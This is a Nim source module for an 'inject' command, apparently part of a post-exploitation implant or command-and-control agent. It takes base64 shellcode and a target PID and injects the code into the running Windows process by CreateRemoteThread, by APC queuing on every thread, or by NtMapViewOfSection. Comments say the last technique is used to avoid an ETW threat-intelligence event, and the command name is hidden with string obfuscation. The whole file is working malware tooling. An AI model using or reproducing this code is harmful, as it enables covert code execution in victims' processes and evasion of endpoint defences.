## inject — Shellcode injection into a running process by PID (Windows only).
## Techniques:
##   createremotethread — allocate RW, write, VirtualProtectEx RX, CreateRemoteThread
##   queueapcthread     — allocate RW, write, RX, QueueUserAPC on every thread of target
##   ntmapview          — NtCreateSection+NtMapViewOfSection (backed section, avoids
##                        NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread
import std/[base64, json, strutils]
import core/types
import commands/registry
import crypto/strenc

when defined(windows):
  type
    HANDLE    = int
    DWORD     = uint32
    LONG      = int32
    NTSTATUS  = LONG
    BOOL      = int32
    LPVOID    = pointer
    SIZE_T    = uint
    ULONG_PTR = uint

  const
    PROCESS_ALL_ACCESS    = DWORD(0x001FFFFF)
    PROCESS_CREATE_PROCESS = DWORD(0x0080)
    MEM_COMMIT            = DWORD(0x00001000)
    MEM_RESERVE           = DWORD(0x00002000)
    PAGE_READWRITE        = DWORD(0x04)
    PAGE_EXECUTE_READ     = DWORD(0x20)
    PAGE_EXECUTE_READWRITE = DWORD(0x40)
    TH32CS_SNAPTHREAD     = DWORD(0x00000004)
    THREAD_ALL_ACCESS     = DWORD(0x001FFFFF)
    INVALID_HANDLE_VALUE  = HANDLE(-1)
    SECTION_ALL_ACCESS_I  = DWORD(0x000F001F)
    SEC_COMMIT_I          = DWORD(0x8000000)
    STATUS_SUCCESS_I      = NTSTATUS(0)
    ViewUnmapI            = DWORD(2)

  type
    THREADENTRY32 {.pure.} = object
      dwSize:             DWORD
      cntUsage:           DWORD
      th32ThreadID:       DWORD
      th32OwnerProcessID: DWORD
      tpBasePri:          LONG
      tpDeltaPri:         LONG
      dwFlags:            DWORD

  proc OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL,
                   dwProcessId: DWORD): HANDLE
    {.importc: "OpenProcess", dynlib: "kernel32".}

  proc VirtualAllocEx(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
                      flAllocationType: DWORD, flProtect: DWORD): LPVOID
    {.importc: "VirtualAllocEx", dynlib: "kernel32".}

  proc WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID,
                          lpBuffer: pointer, nSize: SIZE_T,
                          lpNumberOfBytesWritten: ptr SIZE_T): BOOL
    {.importc: "WriteProcessMemory", dynlib: "kernel32".}

  proc VirtualProtectEx(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
                        flNewProtect: DWORD, lpflOldProtect: ptr DWORD): BOOL
    {.importc: "VirtualProtectEx", dynlib: "kernel32".}

  proc CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: pointer,
                          dwStackSize: SIZE_T, lpStartAddress: LPVOID,
                          lpParameter: LPVOID, dwCreationFlags: DWORD,
                          lpThreadId: ptr DWORD): HANDLE
    {.importc: "CreateRemoteThread", dynlib: "kernel32".}

  proc CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD): HANDLE
    {.importc: "CreateToolhelp32Snapshot", dynlib: "kernel32".}

  proc Thread32First(hSnapshot: HANDLE, lpte: ptr THREADENTRY32): BOOL
    {.importc: "Thread32First", dynlib: "kernel32".}

  proc Thread32Next(hSnapshot: HANDLE, lpte: ptr THREADENTRY32): BOOL
    {.importc: "Thread32Next", dynlib: "kernel32".}

  proc OpenThread(dwDesiredAccess: DWORD, bInheritHandle: BOOL,
                  dwThreadId: DWORD): HANDLE
    {.importc: "OpenThread", dynlib: "kernel32".}

  proc QueueUserAPC(pfnAPC: LPVOID, hThread: HANDLE, dwData: ULONG_PTR): DWORD
    {.importc: "QueueUserAPC", dynlib: "kernel32".}

  proc CloseHandle(hObject: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}

  proc GetCurrentProcess(): HANDLE
    {.importc: "GetCurrentProcess", dynlib: "kernel32".}

  # NT functions for NtMapViewOfSection injection
  proc NtCreateSection(
    SectionHandle: ptr HANDLE, DesiredAccess: DWORD,
    ObjectAttributes: pointer, MaximumSize: ptr int64,
    SectionPageProtection: DWORD, AllocationAttributes: DWORD,
    FileHandle: HANDLE
  ): NTSTATUS {.importc, stdcall, dynlib: "ntdll".}

  proc NtMapViewOfSection(
    SectionHandle: HANDLE, ProcessHandle: HANDLE,
    BaseAddress: ptr LPVOID, ZeroBits: uint,
    CommitSize: SIZE_T, SectionOffset: pointer,
    ViewSize: ptr SIZE_T, InheritDisposition: DWORD,
    AllocationType: DWORD, Win32Protect: DWORD
  ): NTSTATUS {.importc, stdcall, dynlib: "ntdll".}

  proc NtUnmapViewOfSection(
    ProcessHandle: HANDLE, BaseAddress: LPVOID
  ): NTSTATUS {.importc, stdcall, dynlib: "ntdll".}

  # ---------------------------------------------------------------------------

  proc injectCRT(hProcess: HANDLE, remoteMem: LPVOID): string =
    var threadId: DWORD = 0
    let hThread = CreateRemoteThread(hProcess, nil, SIZE_T(0),
                                     remoteMem, nil, DWORD(0), addr threadId)
    if hThread == 0 or hThread == INVALID_HANDLE_VALUE:
      return "Error: CreateRemoteThread failed"
    discard CloseHandle(hThread)
    return "TID " & $threadId

  proc injectAPC(hProcess: HANDLE, remoteMem: LPVOID, pid: DWORD): string =
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, DWORD(0))
    if snap == INVALID_HANDLE_VALUE:
      return "Error: CreateToolhelp32Snapshot failed"

    var te: THREADENTRY32
    te.dwSize = DWORD(sizeof(THREADENTRY32))

    var queued = 0
    if Thread32First(snap, addr te) != 0:
      while true:
        if te.th32OwnerProcessID == pid:
          let hThr = OpenThread(THREAD_ALL_ACCESS, BOOL(0), te.th32ThreadID)
          if hThr != 0 and hThr != INVALID_HANDLE_VALUE:
            discard QueueUserAPC(remoteMem, hThr, ULONG_PTR(0))
            inc queued
            discard CloseHandle(hThr)
        if Thread32Next(snap, addr te) == 0:
          break

    discard CloseHandle(snap)
    if queued == 0:
      return "Error: no threads found in target process"
    return $queued & " APC(s) queued"

  proc allocMapView(hProcess: HANDLE, shellcode: seq[byte]): LPVOID =
    ## NtCreateSection + NtMapViewOfSection: pagefile-backed section.
    ## Avoids NtAllocateVirtualMemory (called by VirtualAllocEx) which fires
    ## the ETW Microsoft-Windows-Threat-Intelligence MWTI event.
    var hSec: HANDLE = 0
    var sz = int64(shellcode.len)
    if NtCreateSection(addr hSec, SECTION_ALL_ACCESS_I, nil, addr sz,
                       PAGE_EXECUTE_READWRITE, SEC_COMMIT_I,
                       HANDLE(0)) != STATUS_SUCCESS_I:
      return nil
    defer: discard CloseHandle(hSec)

    var localBase: LPVOID = nil
    var viewSz: SIZE_T = 0
    if NtMapViewOfSection(hSec, GetCurrentProcess(), addr localBase, 0, 0, nil,
                          addr viewSz, ViewUnmapI, 0,
                          PAGE_READWRITE) != STATUS_SUCCESS_I:
      return nil

    copyMem(localBase, unsafeAddr shellcode[0], shellcode.len)
    discard NtUnmapViewOfSection(GetCurrentProcess(), localBase)

    var remoteBase: LPVOID = nil
    viewSz = 0
    if NtMapViewOfSection(hSec, hProcess, addr remoteBase, 0, 0, nil,
                          addr viewSz, ViewUnmapI, 0,
                          PAGE_EXECUTE_READ) != STATUS_SUCCESS_I:
      return nil

    return remoteBase

# ---------------------------------------------------------------------------

proc injectExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("inject is Windows-only"), status: "error", completed: true)
  else:
    let pid          = DWORD(params{"pid"}.getInt(0))
    let technique    = params{"technique"}.getStr("createremotethread")
    let shellcodeB64 = params{"shellcode"}.getStr("")

    if pid == 0:
      return TaskResult(output: "Error: pid parameter required",
                        status: "error", completed: true)
    if shellcodeB64.len == 0:
      return TaskResult(output: "Error: shellcode parameter required",
                        status: "error", completed: true)

    var shellcode: seq[byte]
    try:
      let decoded = decode(shellcodeB64)
      shellcode = newSeq[byte](decoded.len)
      for i, c in decoded:
        shellcode[i] = byte(ord(c))
    except Exception as e:
      return TaskResult(output: "Error decoding shellcode: " & e.msg,
                        status: "error", completed: true)

    if shellcode.len == 0:
      return TaskResult(output: "Error: empty shellcode",
                        status: "error", completed: true)

    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)
    if hProcess == 0:
      return TaskResult(output: "Error: OpenProcess failed for PID " & $pid,
                        status: "error", completed: true)

    var remoteMem: LPVOID = nil
    var allocErr = ""

    if technique == "ntmapview":
      # NtCreateSection + NtMapViewOfSection — avoids VirtualAllocEx / MWTI ETW
      remoteMem = allocMapView(hProcess, shellcode)
      if remoteMem == nil:
        allocErr = "Error: NtMapViewOfSection allocation failed"
    else:
      # Classic VirtualAllocEx path
      remoteMem = VirtualAllocEx(hProcess, nil, SIZE_T(shellcode.len),
                                 MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
      if remoteMem == nil:
        allocErr = "Error: VirtualAllocEx failed"
      else:
        var written: SIZE_T = 0
        let wok = WriteProcessMemory(hProcess, remoteMem, addr shellcode[0],
                                     SIZE_T(shellcode.len), addr written)
        if wok == 0:
          discard CloseHandle(hProcess)
          return TaskResult(output: "Error: WriteProcessMemory failed",
                            status: "error", completed: true)
        var oldProtect: DWORD = 0
        discard VirtualProtectEx(hProcess, remoteMem, SIZE_T(shellcode.len),
                                 PAGE_EXECUTE_READ, addr oldProtect)

    if remoteMem == nil:
      discard CloseHandle(hProcess)
      return TaskResult(output: allocErr, status: "error", completed: true)

    let msg =
      if technique == "queueapcthread":
        injectAPC(hProcess, remoteMem, pid)
      elif technique == "ntmapview":
        injectCRT(hProcess, remoteMem)
      else:
        injectCRT(hProcess, remoteMem)

    discard CloseHandle(hProcess)

    let ok = not msg.startsWith("Error")
    return TaskResult(
      output:    if ok: "Inject OK — PID " & $pid & " (" & $shellcode.len &
                        " bytes, " & technique & "): " & msg
                 else: msg,
      status:    if ok: "success" else: "error",
      completed: true,
    )

proc initInject*() =
  register(hidstr("inject"), injectExecute)
